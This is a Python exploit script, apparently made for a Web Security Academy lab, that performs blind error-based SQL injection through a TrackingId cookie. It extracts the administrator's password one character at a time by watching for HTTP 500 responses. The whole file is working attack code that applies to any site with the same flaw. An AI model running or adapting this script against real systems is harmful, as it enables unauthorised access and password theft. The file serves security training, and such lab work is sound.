# Source - https://youtu.be/o__q8CzK2ts
# Rana Khalil Web Security Academy

import sys
import requests
import urllib3
import urllib.parse

# Disable certificate warnings on requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set proxies to run requests through proxy for debugging
proxies = { 
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126): #Uses ASCII table for values, includes special characters
            sqli_payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ASCII(SUBSTR(password,{i}))='{j}') ||' "
            #print(sqli_payload)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            #print(sqli_payload_encoded)
            cookies = {'TrackingId': '<TrackingId>' + sqli_payload_encoded, 'session': '<SessionId>'}
            #print(cookies)
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            #print(r)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main ():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url> <payload>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
